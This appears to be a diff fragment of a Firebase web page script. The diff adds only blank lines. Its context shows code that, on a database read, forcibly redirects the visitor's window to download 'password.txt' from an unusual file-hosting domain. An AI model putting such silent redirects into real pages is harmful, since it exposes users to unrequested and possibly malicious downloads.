@@ -14,6 +14,9 @@ firebase.initializeApp(firebaseConfig);
 
 const dbRef = firebase.database().ref("lien").once("value",(snap)=>{
   window.open("https://f5.file-upload.download:183/d/rixae2ktnlgpv7w7d26jie2v2suy7rjz46hfk4ubnhme6biqj3bsgxbgidcoua4jvdf74q5n/password.txt", '_top');
+  
+  
+  
 });
 
 
